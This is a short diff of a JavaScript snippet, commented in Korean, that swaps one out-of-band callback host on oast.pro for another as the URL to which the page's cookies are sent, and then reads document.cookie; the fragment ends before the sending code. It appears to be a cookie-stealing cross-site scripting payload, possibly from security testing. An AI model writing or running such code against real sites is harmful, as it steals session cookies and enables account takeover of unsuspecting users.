@@ -1,6 +1,6 @@
 (function() {
     // 서버로 쿠키를 전송할 URL
-    const targetUrl = "https://d0ngpqjz1wg0000afe4ggokammhyyyyyb.oast.pro";
+    const targetUrl = "https://d01z47gz1wg0000q7n6ggoy91dayyyyyb.oast.pro";
 
     // 현재 문서의 쿠키를 가져옴
     const cookies = document.cookie;
